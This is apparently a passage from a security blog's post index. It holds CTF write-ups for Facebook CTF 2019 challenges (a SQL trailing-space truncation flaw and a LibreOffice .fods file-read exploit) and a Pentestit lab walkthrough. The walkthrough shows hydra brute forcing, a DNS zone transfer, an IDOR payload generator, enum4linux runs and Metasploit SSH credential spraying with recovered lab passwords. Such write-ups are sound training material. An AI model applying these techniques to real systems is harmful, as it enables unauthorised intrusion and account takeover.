mysqli($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DBNAME);if ($db-&gt;connect_error) {  die(\"Connection failed: \" . $db-&gt;connect_error);}function check_errors($var) {  if ($var === false) {    die(\"Error. Please contact administrator.\");  }}function get_top_products() {  global $db;  $statement = $db-&gt;prepare(    \"SELECT name FROM products LIMIT 5\"  );  check_errors($statement);  check_errors($statement-&gt;execute());  $res = $statement-&gt;get_result();  check_errors($res);  $products = [];  while ( ($product = $res-&gt;fetch_assoc()) !== null) {    array_push($products, $product);  }  $statement-&gt;close();  return $products;}function get_product($name) {  global $db;  $statement = $db-&gt;prepare(    \"SELECT name, description FROM products WHERE name = ?\"  );  check_errors($statement);  $statement-&gt;bind_param(\"s\", $name);  check_errors($statement-&gt;execute());  $res = $statement-&gt;get_result();  check_errors($res);  $product = $res-&gt;fetch_assoc();  $statement-&gt;close();  return $product;}function insert_product($name, $secret, $description) {  global $db;  $statement = $db-&gt;prepare(    \"INSERT INTO products (name, secret, description) VALUES      (?, ?, ?)\"  );  check_errors($statement);  $statement-&gt;bind_param(\"sss\", $name, $secret, $description);  check_errors($statement-&gt;execute());  $statement-&gt;close();}function check_name_secret($name, $secret) {  global $db;  $valid = false;  $statement = $db-&gt;prepare(    \"SELECT name FROM products WHERE name = ? AND secret = ?\"  );  check_errors($statement);  $statement-&gt;bind_param(\"ss\", $name, $secret);  check_errors($statement-&gt;execute());  $res = $statement-&gt;get_result();  check_errors($res);  if ($res-&gt;fetch_assoc() !== null) {    $valid = true;  }  $statement-&gt;close();  return $valid;}view.php&lt;?phprequire_once(\"db.php\");require_once(\"header.php\");function handle_post() {  global $_POST;  $name = $_POST[\"name\"];  $secret = $_POST[\"secret\"];  if (isset($name) &amp;&amp; $name !== \"\"        &amp;&amp; isset($secret) &amp;&amp; $secret !== \"\") {    if (check_name_secret($name, hash('sha256', $secret)) === false) {      return \"Incorrect name or secret, please try again\";    }    $product = get_product($name);    echo \"&lt;p&gt;Product details:\";    echo \"&lt;ul&gt;&lt;li&gt;\" . htmlentities($product['name']) . \"&lt;/li&gt;\";    echo \"&lt;li&gt;\" . htmlentities($product['description']) . \"&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;\";  }  return null;}$error = handle_post();if ($error !== null) {  echo \"&lt;p&gt;Error: \" . $error . \"&lt;/p&gt;\";}?&gt;&lt;form action=\"/view.php\" method=\"POST\"&gt;  Name: &lt;input type=\"text\" name=\"name\" /&gt;&lt;br /&gt;  Secret: &lt;input type=\"password\" name=\"secret\" /&gt;&lt;br /&gt;  &lt;input type=\"submit\" value=\"View\" /&gt;&lt;/form&gt;&lt;?php require_once(\"footer.php\");add.php&lt;?phprequire_once(\"db.php\");require_once(\"header.php\");function validate_secret($secret) {  if (strlen($secret) &lt; 10) {    return false;  }  $has_lowercase = false;  $has_uppercase = false;  $has_number = false;  foreach (str_split($secret) as $ch) {    if (ctype_lower($ch)) {      $has_lowercase = true;    } else if (ctype_upper($ch)) {      $has_uppercase = true;    } else if (is_numeric($ch)) {      $has_number = true;    }  }  return $has_lowercase &amp;&amp; $has_uppercase &amp;&amp; $has_number;}function handle_post() {  global $_POST;  $name = $_POST[\"name\"];  $secret = $_POST[\"secret\"];  $description = $_POST[\"description\"];  if (isset($name) &amp;&amp; $name !== \"\"        &amp;&amp; isset($secret) &amp;&amp; $secret !== \"\"        &amp;&amp; isset($description) &amp;&amp; $description !== \"\") {    if (validate_secret($secret) === false) {      return \"Invalid secret, please check requirements\";    }    $product = get_product($name);    if ($product !== null) {      return \"Product name already exists, please enter again\";    }    insert_product($name, hash('sha256', $secret), $description);    echo \"&lt;p&gt;Product has been added&lt;/p&gt;\";  }  return null;}$error = handle_post();if ($error !== null) {  echo \"&lt;p&gt;Error: \" . $error . \"&lt;/p&gt;\";}?&gt;&lt;form action=\"/add.php\" method=\"POST\"&gt;  Name of your product: &lt;input type=\"text\" name=\"name\" /&gt;&lt;br /&gt;  Secret (10+ characters, smallcase, uppercase, number) : &lt;input type=\"password\" name=\"secret\" /&gt;&lt;br /&gt;  Description: &lt;input type=\"text\" name=\"description\" /&gt;&lt;br /&gt;  &lt;input type=\"submit\" value=\"Add\" /&gt;&lt;/form&gt;&lt;?php require_once(\"footer.php\");Looking at the comments, there is information regarding where the flag is hidden.*INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');INSERT INTO products VALUES('messenger', sha256(....), ....);INSERT INTO products VALUES('instagram', sha256(....), ....);INSERT INTO products VALUES('whatsapp', sha256(....), ....);INSERT INTO products VALUES('oculus-rift', sha256(....), ....);*/It seems like the goal of this challenge is to read the description value of the facebook product. This could be possible through SQL injection or brute force of the secret value/field. Looking at the source code, prepared statements seems to be in use.  $statement = $db-&gt;prepare(    \"SELECT name FROM products WHERE name = ? AND secret = ?\"  );  check_errors($statement);  $statement-&gt;bind_param(\"ss\", $name, $secret);Futhermore, the secret value is also hashed using SHA256 and compared to the one in the database. Looking at the source code, it also not possible to confuse the application by inserting the same product name since checks are in place.    $product = get_product($name);    if ($product !== null) {      return \"Product name already exists, please enter again\";    }However the following code looks like an entry pointfunction get_product($name) {  global $db;  $statement = $db-&gt;prepare(    \"SELECT name, description FROM products WHERE name = ?\"  );  check_errors($statement);  $statement-&gt;bind_param(\"s\", $name);  check_errors($statement-&gt;execute());  $res = $statement-&gt;get_result();  check_errors($res);  $product = $res-&gt;fetch_assoc();  $statement-&gt;close();  return $product;}Tracing the code to where it is being called (see below), the following can be deduced.The check_name_secret function checks if a product exists with the entered name and secret value. However, the get_product function only returns one row from the database by using the name parameter. As such, you could add another product called facebook with a secret and get the application program to return the first already creadted product found with the name facebook.function handle_post() {  global $_POST;  $name = $_POST[\"name\"];  $secret = $_POST[\"secret\"];  if (isset($name) &amp;&amp; $name !== \"\"        &amp;&amp; isset($secret) &amp;&amp; $secret !== \"\") {    if (check_name_secret($name, hash('sha256', $secret)) === false) {      return \"Incorrect name or secret, please try again\";    }    $product = get_product($name);    echo \"&lt;p&gt;Product details:\";    echo \"&lt;ul&gt;&lt;li&gt;\" . htmlentities($product['name']) . \"&lt;/li&gt;\";    echo \"&lt;li&gt;\" . htmlentities($product['description']) . \"&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;\";  }  return null;}This vulnerability could be exploited using a vulnerability similiar to SQL Truncation Attack. This is due to MySQL comparing values within taking into account trailing spaces. Here we will enter a product with spaces e.g. facebook into the application which will be stored within the database. This will then become facebook when we try to view the product again due to the comparison issue and we can view the facebook product to acquire our flag.The flag can be seen below."
  },
  
  {
    "title": "Facebook CTF 2019 : pdfme Writeup",
    "url": "/posts/10_Facebook_CTF_pdfme/",
    "categories": "capture the flag",
    "tags": "facebook ctf",
    "date": "2019-06-09 03:25:52 +0800",
    





    
    "snippet": "This challenge was part of Facebook CTF . Looking at the challenge tab, the following information is provided:The goal of this challenge is the exploit the PDF conversion service seen below.Looking...",
    "content": "This challenge was part of Facebook CTF . Looking at the challenge tab, the following information is provided:The goal of this challenge is the exploit the PDF conversion service seen below.Looking at the upload page, a file with .fods extension can be uploaded. This extension corresponds to the OpenDocument Spreadsheet format: OpenDocument_Spreadsheet FileformatLets try to see if we can fake and extension and what result gets uploaded.echo \"Hello World\" &gt; test.fodsUploading the above file was successful and a PDF was generated.sams@sams-snyk:~$ exiftool 1.pdf ExifTool Version Number         : 10.80File Name                       : 1.pdfDirectory                       : .File Size                       : 7.2 kBFile Modification Date/Time     : 2019:06:07 23:46:55+01:00File Access Date/Time           : 2019:06:07 23:47:00+01:00File Inode Change Date/Time     : 2019:06:07 23:47:00+01:00File Permissions                : rw-rw-r--File Type                       : PDFFile Type Extension             : pdfMIME Type                       : application/pdfPDF Version                     : 1.4Linearized                      : NoPage Count                      : 1Language                        : en-USCreator                         : WriterProducer                        : LibreOffice 6.0Create Date                     : 2019:06:07 22:46:45ZThis shows us that the web application is converting the file to a PDF using LibreOffice 6.0 Calc. By searching exploit-db for relevant vulnerabilities, the following exploit looks probable to work - www.exploit-db.com/exploits/44022The author also provided a GitHub Repository where the PoC code can be downloaded: poc.fodsThe proof of concept code can be used to read the passwd file within the application’s hosted linux system. Uploading the provided PoC and looking at the created PDF, you can see the passwd file on the system.Retrieval of the passwd file tells us that the home directory of the libreoffice_admin user is /home/libreoffice_admin. After multiple attempts, the flag was found to be within the follow directory path: home/libreoffice_admin/flag"
  },
  
  {
    "title": "Pentestit TestLab V12 Walkthrough",
    "url": "/posts/10_pentestit_v12_walkthrough/",
    "categories": "network security",
    "tags": "pentestit",
    "date": "2019-01-22 03:25:52 +0800",
    





    
    "snippet": "This walkthrough shows the process I used to capture and complete some systems within the Pentestit v12 test lab. This walkthrough contains my field notes I took when I was working through the box....",
    "content": "This walkthrough shows the process I used to capture and complete some systems within the Pentestit v12 test lab. This walkthrough contains my field notes I took when I was working through the box. The “Test lab” is presented as a computer network of virtual companies containing widely of distributed misconfigurations and vulnerabilities. Players will need to discover vulnerable hosts, exploit them and then find the token.Mail TokenThe first step consists of the reconnaissance phase as ports scanning, banner grabbing, misconfigurations and so on. Once you create a free account, Pentestit will provide you a VPN configuration which you can then use to connect to the TestLab network. Once connected, the Lab gateways are 192.168.101.12 and 192.168.101.13A port scan of the .12 system shows the following services open.root@kali:# nmap -sV 192.168.101.12 -T4 -p- -vvCompleted Service scan at 13:58, 8.28s elapsed (4 services on 1 host)NSE: Script scanning 192.168.101.12.NSE: Starting runlevel 1 (of 2) scan.Initiating NSE at 13:58Completed NSE at 13:58, 1.49s elapsedNSE: Starting runlevel 2 (of 2) scan.Initiating NSE at 13:58Completed NSE at 13:58, 0.00s elapsedNmap scan report for site.test.lab (192.168.101.12)Host is up, received echo-reply ttl 62 (0.12s latency).Scanned at 2019-01-19 13:53:27 EST for 329sNot shown: 65531 filtered portsReason: 65531 no-responsesPORT     STATE SERVICE REASON         VERSION25/tcp   open  smtp    syn-ack ttl 61 Postfix smtpd80/tcp   open  http    syn-ack ttl 61 nginx 1.14.2143/tcp  open  imap    syn-ack ttl 61 Dovecot imapd8080/tcp open  http    syn-ack ttl 61 nginxService Info: Host: -mail.test.labRead data files from: /usr/bin/../share/nmapBrowsing to port 80 shows a WordPress site in use and a Roundcube Webmail instance was discoverable on port 8080. After quickly discovering the virtual host is called site.test.lab, the /etc/hosts file can be modified to include this information. WPScan can be used to enumerate the WordPress installationoot@kali:# wpscan --url http://site.test.lab --random-user-agent_______________________________________________________________        __          _______   _____        \\ \\        / /  __ \\ / ____|         \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®          \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\           \\  /\\  /  | |     ____) | (__| (_| | | | |            \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|        WordPress Security Scanner by the WPScan Team                       Version 3.3.1          Sponsored by Sucuri - https://sucuri.net      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart________________________________________________________________[+] URL: http://site.test.lab/[+] Started: Fri Jan 18 18:18:44 2019Interesting Finding(s):[+] http://site.test.lab/ | Interesting Entry: Server: nginx/1.14.2 | Found By: Headers (Passive Detection) | Confidence: 100%[+] http://site.test.lab/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] WordPress version 4.9.8 identified. | Detected By: Rss Generator (Passive Detection) |  - http://site.test.lab/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.9.8&lt;/generator&gt; |  - http://site.test.lab/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.9.8&lt;/generator&gt; | | [!] 7 vulnerabilities identified: | | [!] Title: WordPress &lt;= 5.0 - Authenticated File Delete |     Fixed in: 4.9.9 |     References: |      - https://wpvulndb.com/vulnerabilities/9169 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress &lt;= 5.0 - Authenticated Post Type Bypass |     Fixed in: 4.9.9 |     References: |      - https://wpvulndb.com/vulnerabilities/9170 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/ | | [!] Title: WordPress &lt;= 5.0 - PHP Object Injection via Meta Data |     Fixed in: 4.9.9 |     References: |      - https://wpvulndb.com/vulnerabilities/9171 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress &lt;= 5.0 - Authenticated Cross-Site Scripting (XSS) |     Fixed in: 4.9.9 |     References: |      - https://wpvulndb.com/vulnerabilities/9172 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress &lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins |     Fixed in: 4.9.9 |     References: |      - https://wpvulndb.com/vulnerabilities/9173 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460 | | [!] Title: WordPress &lt;= 5.0 - User Activation Screen Search Engine Indexing |     Fixed in: 4.9.9 |     References: |      - https://wpvulndb.com/vulnerabilities/9174 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress &lt;= 5.0 - File Upload to XSS on Apache Web Servers |     Fixed in: 4.9.9 |     References: |      - https://wpvulndb.com/vulnerabilities/9175 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a[+] WordPress theme in use: twentyseventeen | Location: http://site.test.lab/wp-content/themes/twentyseventeen/ | Last Updated: 2019-01-09T00:00:00.000Z | Readme: http://site.test.lab/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.0 | Style URL: http://site.test.lab/wp-content/themes/twentyseventeen/style.css?ver=4.9.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Detected By: Css Style (Passive Detection) | | Version: 1.7 (80% confidence) | Detected By: Style (Passive Detection) |  - http://site.test.lab/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: 'Version: 1.7'[+] Enumerating All Plugins[+] Checking Plugin Versions[i] Plugin(s) Identified:[+] wp-survey-and-poll | Location: http://site.test.lab/wp-content/plugins/wp-survey-and-poll/ | Last Updated: 2019-01-14T22:50:00.000Z | [!] The version is out of date, the latest version is 1.5.8 | | Detected By: Urls In Homepage (Passive Detection) | | Version: 1.5.7.8 (50% confidence) | Detected By: Readme - ChangeLog Section (Aggressive Detection) |  - http://site.test.lab/wp-content/plugins/wp-survey-and-poll/readme.txt[+] Enumerating Config Backups Checking Config Backups - Time: 00:00:00 &lt;===============================================================================================&gt; (21 / 21) 100.00% Time: 00:00:00[i] No Config Backups Found.[+] Finished: Fri Jan 18 18:18:52 2019[+] Requests Done: 53[+] Memory used: 60.688 MB[+] Elapsed time: 00:00:07root@kali:~# Spidering of the application also revealed additional information regarding the themes and plugins in use. However, these were found hard to exploit due to the use of a Web Application Firewall within the WordPress application. However, by looking at the main WordPress webpage. It was possible to identify a email/username.Using this username, brute force attacks can now be conducted to possibly get access to to to the Roundcube Webmail instance, WordPress dashboard, or the IMAP. After trying all three potential targets, the password of the info user was successfully brute forced by leveraging the IMAP service.root@kali:/# hydra -l info@test.lab -P /root/rockyou.txt imap://192.168.101.12/PLAINHydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2019-01-19 14:08:43[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal![DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task[DATA] attacking imap://192.168.101.12:143/PLAIN[143][imap] host: 192.168.101.12   login: info@test.lab   password: 1234567891 of 1 target successfully completed, 1 valid password found[WARNING] Writing restore file because 3 final worker threads did not complete until end.[ERROR] 3 targets did not resolve or could not be connected[ERROR] 16 targets did not completeHydra (http://www.thc.org/thc-hydra) finished at 2019-01-19 14:08:50Using the found password, it was possible to successfully login to the Roundcube Webmail as the info user.Looking through the info user’s emails, it was possible to find the Mail token, and get hold of a VPN configuration file. A possible username called sviridov@test.lab was also found my looking through the inbox.DNS TokenUsing the found credentials and the VPN config file, a VPN connection can be established and tunnelled through the already established VPN connection. This can be done as seen belowBy looking around, the new subnet that is accessible seems to be 172.16.0.0/16root@kali:# ip ro show dev tun110.11.0.1 via 10.11.0.25 10.11.0.25 proto kernel scope link src 10.11.0.26 172.16.0.0/16 via 10.11.0.25 root@kali:~# A nmap scan with the fast (-F) option can be conducted to quickly find open services. It is worth disabling host discovery within nmap for better coverage.root@kali:~# nmap -F -n 172.16.0.0/16 -v -Pn[SHORTENED FOR ABBREVIATION]Nmap scan report for 172.16.0.10Host is up (0.10s latency).Not shown: 99 filtered portsPORT   STATE SERVICE80/tcp open  httpNmap scan report for 172.16.0.17Host is up (0.10s latency).Not shown: 89 closed portsPORT     STATE SERVICE22/tcp   open  ssh25/tcp   open  smtp53/tcp   open  domain80/tcp   open  http88/tcp   open  kerberos-sec135/tcp  open  msrpc139/tcp  open  netbios-ssn143/tcp  open  imap389/tcp  open  ldap445/tcp  open  microsoft-ds8080/tcp open  http-proxyNmap scan report for 172.16.2.10Host is up (0.051s latency).Not shown: 99 filtered portsPORT   STATE SERVICE53/tcp open  domainThe results discovered multiple DNS servers. One of these DNS servers allowed zone transfers.root@kali:# dig axfr test.lab @172.16.2.10; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-3-Debian &lt;&lt;&gt;&gt; axfr test.lab @172.16.2.10;; global options: +cmdtest.lab.\t\t21600\tIN\tSOA\ttest.lab. ad.test.lab. 69 5 30 21600 60test.lab.\t\t21600\tIN\tNS\tns1.test.lab.test.lab.\t\t21600\tIN\tNS\tns2.test.lab.test.lab.\t\t21600\tIN\tA\t172.16.0.17_kerberos._tcp.dc._msdcs.test.lab. 21600 IN SRV\t0 0 88 test.lab._ldap._tcp.dc._msdcs.test.lab. 21600 IN\tSRV\t0 0 389 test.lab.gc._msdcs.test.lab.\t21600\tIN\tA\t172.16.0.17_ldap._tcp.gc._msdcs.test.lab. 21600 IN\tSRV\t0 0 3268 test.lab._kerberos._tcp.test.lab. 21600\tIN\tSRV\t0 0 88 test.lab._kpasswd._tcp.test.lab.\t21600\tIN\tSRV\t0 0 464 test.lab._ldap._tcp.test.lab.\t21600\tIN\tSRV\t0 0 389 test.lab._kerberos._udp.test.lab. 21600\tIN\tSRV\t0 0 88 test.lab._kpasswd._udp.test.lab.\t21600\tIN\tSRV\t0 0 464 test.lab.ad.test.lab.\t\t21600\tIN\tA\t172.16.0.17db.test.lab.\t\t21600\tIN\tA\t172.16.0.30dc.test.lab.\t\t21600\tIN\tA\t172.16.0.17dns.test.lab.\t\t21600\tIN\tA\t172.16.0.17dns.test.lab.\t\t21600\tIN\tA\t172.16.2.10_ldap._tcp.ForestDnsZones.test.lab. 21600 IN SRV 0 0 389 test.lab.helpdesk.test.lab.\t21600\tIN\tA\t172.16.0.10    my.test.lab.\t\t21600\tIN\tA\t172.16.0.10ns1.test.lab.\t\t21600\tIN\tA\t172.16.0.17ns2.test.lab.\t\t21600\tIN\tA\t172.16.2.10site.test.lab.\t\t21600\tIN\tA\t172.16.0.10[TOKENREMOVEDFROM].test.lab. 21600 IN\tA\t127.0.0.1test.lab.\t\t21600\tIN\tSOA\ttest.lab. ad.test.lab. 69 5 30 21600 60;; Query time: 169 msec;; SERVER: 172.16.2.10#53(172.16.2.10);; WHEN: Sat Jan 19 18:14:26 EST 2019;; XFR size: 26 records (messages 1, bytes 778The DNS token was discovered within the given results.Helpdesk TokenThe IP address and the correct hostname for the helpdesk system can be discovered through the obtain DNS records. A quick port scan revealed that this machine is hosting a web applicationThe previously obtained info user credentials can be used to login in to this applicationObserving the change password area of the helpdesk discovered the use of an obfuscated ID parameter which could potentially be vulnerable to Insecure Direct Object Reference.The value of the ID parameter was found to be Base64 decoded. An decoded example of this value can be seen below.By iterating through a list of parameter values, it could be possible to reset the password for the sviridov user. It should be noted that to generate valid values for the ID parameter, a list of numbers should be generate with a new line at the end. The following PHP code can be used to generate these values.&lt;?php  for ($x = 0; $x &lt;= 500; $x++) {    echo base64_encode($x.'');    echo '&lt;br&gt;';}?&gt;  This payload list can now be used with Burp Intruder to reset the password of the sviridov user.The helpdesk token and the network password of the sviridov user can be found by logging in to the Helpdesk application with the changed password.AD TokenThe domain controller IP address in use for the TEST domain can be found by looking through the DNS records found earlier through the DNS Zone transfer. By conducting a authenticated NetBIOS using enum4linux, information about the domain can be gathered including the AD token.oot@kali:/var/www/html# enum4linux -u 'sviridov@test.lab' -p '5BEiBBtrNq695A!6u5zUR5KxC' -U 172.16.0.17 -aStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 27 10:02:59 2019 ========================== |    Target Information    | ========================== Target ........... 172.16.0.17RID Range ........ 500-550,1000-1050Username ......... 'sviridov@test.lab'Password ......... '5BEiBBtrNq695A!6u5zUR5KxC'Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none =================================================== |    Enumerating Workgroup/Domain on 172.16.0.17    | =================================================== [+] Got domain/workgroup name: TEST ==================================== |    Session Check on 172.16.0.17    | ==================================== [+] Server 172.16.0.17 allows sessions using username 'sviridov@test.lab', password '5BEiBBtrNq695A!6u5zUR5KxC' ========================================== |    Getting domain SID for 172.16.0.17    | ========================================== Domain Name: TESTDomain Sid: S-1-5-21-583374519-1042395902-3096671009[+] Host is part of a domain (not a workgroup) ============================ |    Users on 172.16.0.17    | ============================ index: 0x1 RID: 0x45e acb: 0x00000010 Account: token_fopekr0mf\tName: \tDesc: index: 0x2 RID: 0x1f4 acb: 0x00000010 Account: Administrator\tName: \tDesc: Built-in account for administering the computer/domainindex: 0x3 RID: 0x457 acb: 0x00000010 Account: lomonosov\tName: \tDesc: index: 0x4 RID: 0x452 acb: 0x00000010 Account: sviridov\tName: \tDesc: index: 0x5 RID: 0x454 acb: 0x00000010 Account: sidorov\tName: \tDesc: index: 0x6 RID: 0x1f6 acb: 0x00000011 Account: krbtgt\tName: \tDesc: Key Distribution Center Service Accountindex: 0x7 RID: 0x456 acb: 0x00000010 Account: petrov\tName: \tDesc: index: 0x8 RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: \tDesc: Built-in account for guest access to the computer/domainindex: 0x9 RID: 0x450 acb: 0x00000010 Account: info\tName:  info\tDesc: user:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[info] rid:[0x450]user:[sviridov] rid:[0x452]user:[sidorov] rid:[0x454]user:[petrov] rid:[0x456]user:[lomonosov] rid:[0x457]user:[token_fopekr0mf] rid:[0x45e]enum4linux complete on Sun Jan 27 10:03:06 2019VPN TokenThe initial information provided by Pentestit was that lab gateways are 192.168.101.12 and 192.168.101.13. 192.168.101.13 was accessible by downloading the VPN configuration obtained through the mail token challenge.The VPN configuration can be modified to connect to the 192.168.101.12 VPN. The sviridov credentials previously obtained will need to be used for successful authentication.root@kali:~# ip ro show dev tun110.12.0.1 via 10.12.0.145 10.12.0.145 proto kernel scope link src 10.12.0.146 172.16.0.0/16 via 10.12.0.145 192.168.0.0/24 via 10.12.0.145The same 172 network range seems to be accessible but network Access Control Lists might not been in place. A port scan of this range revealed the following systemsHost is up, received user-set (0.074s latency).Scanned at 2019-01-27 13:20:40 EST for 66sNot shown: 99 filtered portsReason: 99 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON80/tcp open  http    syn-ackNmap scan report for 172.16.0.11Host is up, received user-set (0.058s latency).Scanned at 2019-01-27 13:20:40 EST for 68sNot shown: 98 filtered portsReason: 98 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT    STATE SERVICE REASON25/tcp  open  smtp    syn-ack143/tcp open  imap    syn-ackNmap scan report for 172.16.0.14Host is up, received user-set (0.076s latency).Scanned at 2019-01-27 13:20:40 EST for 67sNot shown: 98 filtered portsReason: 98 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack80/tcp open  http    syn-ackNmap scan report for 172.16.0.17Host is up, received user-set (0.067s latency).Scanned at 2019-01-27 13:20:40 EST for 62sNot shown: 75 closed ports, 19 filtered portsReason: 75 conn-refused and 19 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT    STATE SERVICE      REASON22/tcp  open  ssh          syn-ack53/tcp  open  domain       syn-ack135/tcp open  msrpc        syn-ack139/tcp open  netbios-ssn  syn-ack389/tcp open  ldap         syn-ack445/tcp open  microsoft-ds syn-ackNmap scan report for 172.16.1.10Host is up, received user-set (0.080s latency).Scanned at 2019-01-27 14:26:04 EST for 180sNot shown: 99 filtered portsReason: 99 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON80/tcp open  http    syn-ackNmap scan report for 172.16.1.12Host is up, received user-set (0.063s latency).Scanned at 2019-01-27 14:26:04 EST for 179sNot shown: 98 filtered portsReason: 98 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack80/tcp open  http    syn-ackNmap scan report for 172.16.1.15Host is up, received user-set (0.068s latency).Scanned at 2019-01-27 14:26:04 EST for 182sNot shown: 99 filtered portsReason: 99 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON80/tcp open  http    syn-ackNmap scan report for 172.16.1.20Host is up, received user-set (0.087s latency).Scanned at 2019-01-27 14:26:04 EST for 179sNot shown: 98 filtered portsReason: 98 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE  REASON22/tcp   open  ssh      syn-ack8000/tcp open  http-alt syn-ackNmap scan report for 172.16.1.25Host is up, received user-set (0.15s latency).Scanned at 2019-01-27 14:26:04 EST for 177sNot shown: 99 filtered portsReason: 99 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ackBrowsing to port 80 using a web browser revealed the following tokenSIEM TokenBy browsing to the IP 172.16.1.12 found from the previous Nmap scan, a prewikka prelude SIEM console can be discovered. By trying the previously found credentials for sviridov, authentication to this console was successful.Looking through the console, and by looking at logs from previous 6 months, a few things can be concluded:  The IP address of the repository (repository.test.lab) system is 172.16.1.15  The IP address 172.16.1.10 belongs to vpn-admin.test.lab  The correct domain name for the SIEM system is siem.test.lab  The agents running to obtain SIEM data are both disabledAn overview of these logs can be seen belowThe token for SIEM can be found under the additional data section for the “User missed the password to change UID (user id)” alert belonging to the Repository system.Another interesting alert “Unknown problem somewhere in the system” also gives information regarding a user and potential password for the repository system.Repository TokenUsing the found credentials from the previous SIEM log, access to the repository system can be obtained using the “admin:IFGpajdlkmaw2of” credentials.This webserver contains an unknown binary, a jar file, and a file called token with no extension. The token file is a ASCII text that contains the token for repository.Users TokenScanning the “192.168.0.0/24” range shows numerous SSH services being availiable externally. A quick Nmap scan can be done to rediscover these results.root@kali:~/pentestit# nmap -sS -n -vvv 192.168.0.0/24 -Pn -p 21,22,80,139,443,445,8080,3389 --openNmap scan report for 192.168.0.1022/tcp open  ssh     syn-ack ttl 62Nmap scan report for 192.168.0.1522/tcp open  ssh     syn-ack ttl 62Nmap scan report for 192.168.0.3022/tcp open  ssh     syn-ack ttl 62Nmap scan report for 192.168.0.10022/tcp open  ssh     syn-ack ttl 62Nmap scan report for 192.168.0.20522/tcp open  ssh     syn-ack ttl 62Nmap scan report for 192.168.0.24022/tcp open  ssh     syn-ack ttl 62The credentials previously recovered for “sviridov” and “admin” user can be sprayed across these services using Crackmapexec or Metasploit.root@kali:~# msfconsole -nq[-] ***[-] * WARNING: Database support has been disabled[-] ***msf5 &gt; use auxiliary/scanner/ssh/ssh_loginmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME sviridov@test.labUSERNAME =&gt; sviridov@test.labmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASSWORD 5BEiBBtrNq695A!6u5zUR5KxCPASSWORD =&gt; 5BEiBBtrNq695A!6u5zUR5KxCmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS file:/root/sshhosts.txtRHOSTS =&gt; file:/root/sshhosts.txtmsf5 auxiliary(scanner/ssh/ssh_login) &gt; show optionsModule options (auxiliary/scanner/ssh/ssh_login):   Name              Current Setting            Required  Description   ----              ---------------            --------  -----------   BLANK_PASSWORDS   false                      no        Try blank passwords for all users   BRUTEFORCE_SPEED  5                          yes       How fast to bruteforce, from 0 to 5   DB_ALL_CREDS      false                      no        Try each user/password couple stored in the current database   DB_ALL_PASS       false                      no        Add all passwords in the current database to the list   DB_ALL_USERS      false                      no        Add all users in the current database to the list   PASSWORD          